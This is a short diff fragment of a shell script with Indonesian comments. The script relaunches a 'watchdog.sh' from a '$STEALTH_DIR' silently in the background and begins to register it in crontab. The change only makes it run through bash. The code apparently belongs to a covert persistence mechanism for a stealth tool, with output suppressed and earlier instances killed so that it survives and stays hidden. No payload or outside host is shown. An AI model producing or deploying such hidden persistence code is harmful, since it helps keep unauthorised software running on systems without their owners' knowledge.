@@ -35,7 +35,7 @@ chmod +x "$STEALTH_DIR/watchdog.sh"
 # Jalankan watchdog
 pkill -f "$STEALTH_DIR/watchdog.sh" 2>/dev/null
 echo "[*] Running watchdog -> background..."
-nohup "$STEALTH_DIR/watchdog.sh" > /dev/null 2>&1 &
+nohup bash "$STEALTH_DIR/watchdog.sh" > /dev/null 2>&1 &
 
 # Tambahkan ke crontab
 if command -v crontab >/dev/null 2>&1; then
